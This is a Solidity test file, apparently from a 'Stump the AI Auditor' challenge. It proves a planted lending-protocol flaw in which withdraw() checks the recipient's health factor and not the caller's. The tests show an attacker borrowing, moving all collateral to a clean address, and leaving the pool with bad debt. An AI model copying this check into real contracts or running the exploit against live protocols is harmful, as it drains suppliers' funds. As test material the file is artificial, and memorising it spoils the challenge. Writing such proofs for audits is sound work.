// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {BaseTest} from "./helpers/BaseTest.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Lending} from "src/Lending/Lending.sol";
import {LendingMath} from "src/Lending/LendingMath.sol";
import {PriceOracle} from "src/PriceOracle.sol";
import {IPriceOracle} from "src/interfaces/IPriceOracle.sol";
import {ILendingPool} from "src/interfaces/ILendingPool.sol";

// ─────────────────────────────────────────────────────────────────────────────
// Stump the AI Auditor — PoC for Lending.sol
//
// Vulnerability: Withdraw HF Check Uses `to` Instead of `msg.sender`
// Severity: Critical (direct bad debt creation — protocol insolvency)
// Contract: src/Lending/Lending.sol — withdraw() lines 160-161
//
// Root cause:
//   The health factor check after withdrawal validates `to` (the token
//   recipient) instead of `msg.sender` (whose collateral is being removed).
//   When `to` has no debt, the check is skipped entirely. The actual
//   withdrawer can drain all their collateral while holding outstanding debt.
//
// Impact:
//   - Attacker supplies collateral, borrows, then withdraws collateral to
//     a clean address — HF check bypassed
//   - Protocol left with unsecured debt (bad debt)
//   - Suppliers cannot withdraw because pool is insolvent
// ─────────────────────────────────────────────────────────────────────────────

contract PlantPoC_L8 is BaseTest {
    uint256 internal constant WAD = 1e18;
    uint256 internal constant RAY = 1e27;

    MockERC20 internal usdc;
    MockERC20 internal weth;
    Lending internal lending;
    PriceOracle internal oracle;

    address internal attacker;
    address internal cleanAddr;
    address internal supplier;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker");
        cleanAddr = makeAddr("cleanAddr");
        supplier = makeAddr("supplier");

        usdc = deployMockToken("USDC", 6);
        weth = deployMockToken("WETH", 18);

        vm.startPrank(owner);
        oracle = new PriceOracle();
        lending = new Lending(IPriceOracle(address(oracle)), 5_000);

        ILendingPool.InterestRateParams memory irParams = ILendingPool.InterestRateParams({
            baseRateRayPerYear: 1e26,
            slope1RayPerYear: 4e26,
            slope2RayPerYear: 3e27,
            optimalUtilizationBps: 8_000
        });

        lending.listReserve(address(usdc), irParams, 8_000, 8_500, 500, 2_000, true, true);
        lending.listReserve(address(weth), irParams, 7_500, 8_000, 500, 1_000, true, true);

        oracle.setPrice(address(usdc), 1e8);
        oracle.setPrice(address(weth), 2_000e8);
        vm.stopPrank();

        mintAndApprove(usdc, supplier, address(lending), 1_000_000e6);
        mintAndApprove(weth, attacker, address(lending), 1_000 ether);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 1: Regression — withdraw to self still checks HF correctly
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L8_withdrawToSelf_HFStillChecked() public {
        // Supplier provides USDC
        vm.prank(supplier);
        lending.supply(address(usdc), 100_000e6, supplier);

        // Attacker supplies ETH and borrows USDC
        vm.prank(attacker);
        lending.supply(address(weth), 10 ether, attacker);
        vm.prank(attacker);
        lending.borrow(address(usdc), 14_000e6, attacker);

        // Withdraw to SELF — `to == msg.sender`, HF check runs on correct entity
        // Should revert because withdrawing all ETH leaves attacker with 0 collateral + debt
        vm.prank(attacker);
        vm.expectRevert();
        lending.withdraw(address(weth), 10 ether, attacker);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 2: EXPLOIT — withdraw to clean address bypasses HF check
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L8_withdrawToCleanAddr_HFBypassed() public {
        vm.prank(supplier);
        lending.supply(address(usdc), 100_000e6, supplier);

        // Attacker supplies ETH collateral
        vm.prank(attacker);
        lending.supply(address(weth), 10 ether, attacker);

        // Attacker borrows USDC against ETH
        vm.prank(attacker);
        lending.borrow(address(usdc), 14_000e6, attacker);

        // Attacker's HF before: healthy
        (,,, uint256 hfBefore) = lending.getUserAccountData(attacker);
        assertGe(hfBefore, WAD, "attacker healthy before exploit");

        // EXPLOIT: Withdraw ALL collateral to a clean address
        // `cleanAddr` has no debt → _userHasDebt(cleanAddr) = false → HF check SKIPPED
        vm.prank(attacker);
        lending.withdraw(address(weth), 10 ether, cleanAddr);

        // Attacker now has 0 collateral but 14,000 USDC debt
        (uint256 collateral, uint256 debt,,) = lending.getUserAccountData(attacker);
        assertEq(collateral, 0, "attacker drained all collateral");
        assertGt(debt, 0, "attacker still has debt");

        // cleanAddr received the raw ETH tokens (not as a lending position)
        uint256 cleanBalance = weth.balanceOf(cleanAddr);
        assertEq(cleanBalance, 10 ether, "clean address received 10 ETH");

        // Protocol has bad debt — attacker has unsecured debt
        emit log_named_uint("Attacker collateral (USD WAD)", collateral);
        emit log_named_uint("Attacker debt (USD WAD)", debt);
        emit log_named_uint("Bad debt created (USD WAD)", debt);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 3: Repeated exploitation creates unbounded bad debt
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L8_repeatedExploit_unboundedBadDebt() public {
        vm.prank(supplier);
        lending.supply(address(usdc), 500_000e6, supplier);

        // 3 rounds of exploit with fresh attacker addresses
        uint256 totalBadDebt;
        for (uint256 i = 0; i < 3; i++) {
            address atk = makeAddr(string.concat("atk", vm.toString(i)));
            address clean = makeAddr(string.concat("clean", vm.toString(i)));

            mintAndApprove(weth, atk, address(lending), 100 ether);

            vm.prank(atk);
            lending.supply(address(weth), 10 ether, atk);
            vm.prank(atk);
            lending.borrow(address(usdc), 14_000e6, atk);

            // Drain collateral to clean address
            vm.prank(atk);
            lending.withdraw(address(weth), 10 ether, clean);

            (, uint256 atkDebt,,) = lending.getUserAccountData(atk);
            totalBadDebt += atkDebt;
        }

        emit log_named_uint("Total bad debt created (3 rounds, USD WAD)", totalBadDebt);
        // 3 × ~$14,000 = ~$42,000 of bad debt
        assertGt(totalBadDebt, 40_000e18, "massive bad debt accumulated");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 4: Supplier can't withdraw after attacker drains
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L8_supplierCannotWithdraw() public {
        // Small USDC supply — just enough for the attacker to borrow
        vm.prank(supplier);
        lending.supply(address(usdc), 20_000e6, supplier);

        // Attacker borrows most of the pool
        vm.prank(attacker);
        lending.supply(address(weth), 10 ether, attacker);
        vm.prank(attacker);
        lending.borrow(address(usdc), 14_000e6, attacker);

        // Exploit: drain collateral
        vm.prank(attacker);
        lending.withdraw(address(weth), 10 ether, cleanAddr);

        // Supplier tries to withdraw — only 6,000 USDC left in pool
        // (20,000 deposited - 14,000 borrowed)
        // Supplier can get 6,000 back but not their full 20,000
        vm.prank(supplier);
        lending.withdraw(address(usdc), 6_000e6, supplier);

        // Remaining 14,000 is bad debt — attacker won't repay
        uint256 remaining = usdc.balanceOf(address(lending));
        emit log_named_uint("USDC remaining in pool", remaining);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // Scenario 5: Pool still operational (bug is silent, not crashy)
    // ─────────────────────────────────────────────────────────────────────────

    function testPoC_L8_poolRemainsOperational() public {
        vm.prank(supplier);
        lending.supply(address(usdc), 100_000e6, supplier);

        vm.prank(attacker);
        lending.supply(address(weth), 10 ether, attacker);
        vm.prank(attacker);
        lending.borrow(address(usdc), 14_000e6, attacker);

        // Exploit
        vm.prank(attacker);
        lending.withdraw(address(weth), 10 ether, cleanAddr);

        // Pool still accepts new deposits and borrows
        address newUser = makeAddr("newUser");
        mintAndApprove(weth, newUser, address(lending), 100 ether);
        vm.prank(newUser);
        lending.supply(address(weth), 5 ether, newUser);

        // Interest still accrues
        advanceSeconds(30 days);
        lending.accrueInterest(address(usdc));
    }
}
